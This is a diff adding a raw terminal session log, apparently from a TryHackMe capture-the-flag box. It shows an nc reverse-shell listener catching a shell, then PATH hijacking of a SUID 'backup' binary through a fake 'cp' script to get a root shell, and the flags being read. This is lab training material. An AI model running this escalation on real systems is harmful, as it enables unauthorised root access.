@@ -1,0 +1,104 @@
+Script started on 2025-04-10 10:25:08+03:00 [COMMAND="rlwrap nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 4444 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 2177
+bash: cannot set terminal process group (1253): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+archangel@ubuntu:~$ [Karchangel@ubuntu:~$ [K[?2004harchangel@ubuntu:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+myfiles
+secret
+user.txt
+archangel@ubuntu:~$ [Karchangel@ubuntu:~$ [K[?2004harchangel@ubuntu:~$ cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home[Kcd /home[Kcd /home
+archangel@ubuntu:/home$ [Karchangel@ubuntu:/home$ [K[?2004harchangel@ubuntu:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+archangel
+archangel@ubuntu:/home$ [Karchangel@ubuntu:/home$ [K[?2004harchangel@ubuntu:/home$ cd ar   [Kchangle[K[Kel[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd archangel
+[Kcd archangel[Kcd archangel[K[?2004hcd archangells[K[?2004l[Kcd archangel
+archangel@ubuntu:~$ [K[?2004harchangel@ubuntu:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+myfiles
+secret
+user.txt
+archangel@ubuntu:~$ [Karchangel@ubuntu:~$ [K[?2004harchangel@ubuntu:~$ cat user.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt[Kcat user.txt[Kcat user.txt
+thm{lf1_t0_rc3_1s_tr1cky}
+archangel@ubuntu:~$ [Karchangel@ubuntu:~$ [K[?2004harchangel@ubuntu:~$ cd secret[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd secret
+[Kcd secret[Kcd secret[Kcd secret
+archangel@ubuntu:~/secret$ [Karchangel@ubuntu:~/secret$ [K[?2004harchangel@ubuntu:~/secret$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+backup
+user2.txt
+archangel@ubuntu:~/secret$ [Karchangel@ubuntu:~/secret$ [K[?2004harchangel@ubuntu:~/secret$ cat user2.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user2.txt
+[Kcat user2.txt[Kcat user2.txt[Kcat user2.txt
+thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+archangel@ubuntu:~/secret$ [Karchangel@ubuntu:~/secret$ [K[?2004harchangel@ubuntu:~/secret$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l[Kls -l[Kls -l
+total 24
+-rwsr-xr-x 1 root root 16904 Nov 18  2020 backup
+-rw-r--r-- 1 root root    49 Nov 19  2020 user2.txt
+archangel@ubuntu:~/secret$ [Karchangel@ubuntu:~/secret$ [K[?2004harchangel@ubuntu:~/secret$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp[Kcd /tmp[Kcd /tmp
+archangel@ubuntu:/tmp$ [Karchangel@ubuntu:/tmp$ [K[?2004harchangel@ubuntu:/tmp$ echo "/bin/bash -p" > cp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho "/bin/bash -p" > cp
+[Kecho "/bin/bash -p" > cp[Kecho "/bin/bash -p" > cp[Kecho "/bin/bash -p" > cp
+archangel@ubuntu:/tmp$ [Karchangel@ubuntu:/tmp$ [K[?2004harchangel@ubuntu:/tmp$ chmod 777 cp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod 777 cp
+[Kchmod 777 cp[Kchmod 777 cp[Kchmod 777 cp
+archangel@ubuntu:/tmp$ [Karchangel@ubuntu:/tmp$ [K[?2004harchangel@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+cp
+systemd-private-94e9969319084f808cb0e73a0b94f2e3-apache2.service-r7P2bc
+systemd-private-94e9969319084f808cb0e73a0b94f2e3-systemd-resolved.service-ANN24W
+systemd-private-94e9969319084f808cb0e73a0b94f2e3-systemd-timesyncd.service-palrZz
+archangel@ubuntu:/tmp$ [Karchangel@ubuntu:/tmp$ [K[?2004harchangel@ubuntu:/tmp$ export PATH=/tmp[K[K[K[K$PATH:[K[K[K[K[K[K/tmp:$PATH[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexport PATH=/tmp:$PATH
+[Kexport PATH=/tmp:$PATH[Kexport PATH=/tmp:$PATH[Kexport PATH=/tmp:$PATH
+archangel@ubuntu:/tmp$ [Karchangel@ubuntu:/tmp$ [K[?2004harchangel@ubuntu:/tmp$ echo $PATH[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho $PATH
+[Kecho $PATH[Kecho $PATH[Kecho $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+archangel@ubuntu:/tmp$ [Karchangel@ubuntu:/tmp$ [K[?2004harchangel@ubuntu:/tmp$ cd -[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd -
+[Kcd -[Kcd -[Kcd -
+/home/archangel/secret
+archangel@ubuntu:~/secret$ [Karchangel@ubuntu:~/secret$ [K[?2004harchangel@ubuntu:~/secret$ ./backup[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./backup
+[K./backup[K./backup[K./backup
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=0(root) gid=0(root) groups=0(root),1001(archangel)
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash)'[K[K")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kroot@ubuntu:~/secret# [Kroot@ubuntu:~/secret# [K[?2004hroot@ubuntu:~/secret# ls [K[K[Kcd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+root@ubuntu:~# [Kroot@ubuntu:~# [K[?2004hroot@ubuntu:~# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+total 44
+drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
+drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
+-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
+-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
+drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
+drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
+drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
+-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
+drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
+-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
+-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+[Kroot@ubuntu:~# [Kroot@ubuntu:~# [K[?2004hroot@ubuntu:~# cd /root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /root
+[Kcd /root[Kcd /root[Kcd /root
+root@ubuntu:/root# [Kroot@ubuntu:/root# [K[?2004hroot@ubuntu:/root# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 28
+drwx------  4 root root 4096 Nov 20  2020 .
+drwxr-xr-x 22 root root 4096 Nov 16  2020 ..
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Nov 18  2020 .cache
+drwxr-xr-x  3 root root 4096 Nov 16  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   68 Nov 19  2020 root.txt
+root@ubuntu:/root# [Kroot@ubuntu:/root# [K[?2004hroot@ubuntu:/root# cat root.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat root.txt
+[Kcat root.txt[Kcat root.txt[Kcat root.txt
+thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
+root@ubuntu:/root# [Kroot@ubuntu:/root# [K[?2004hroot@ubuntu:/root# exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Karchangel@ubuntu:~/secret$ [Karchangel@ubuntu:~/secret$ [K[?2004harchangel@ubuntu:~/secret$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-04-10 10:35:19+03:00 [COMMAND_EXIT_CODE="0"]
